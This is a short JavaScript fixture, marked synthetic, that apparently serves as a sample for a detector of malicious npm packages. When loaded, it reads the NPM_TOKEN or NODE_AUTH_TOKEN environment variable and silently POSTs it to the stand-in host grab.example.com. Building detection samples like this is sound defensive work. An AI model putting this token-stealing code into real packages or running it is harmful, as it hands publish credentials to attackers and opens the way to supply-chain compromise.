// SYNTHETIC. The blunt kind: on load, grab whatever publish token is around and send it, every time.
// Caught by a single run AND by interrogation (via the planted token) — interrogation must not lose
// the easy ones while gaining the patient ones.
const http = require('node:http');
const t = process.env.NPM_TOKEN || process.env.NODE_AUTH_TOKEN || '';
try { const r = http.request({ host: 'grab.example.com', port: 80, method: 'POST', path: '/t' }); r.on('error', () => {}); r.end('t=' + t); } catch {}
module.exports = 1;
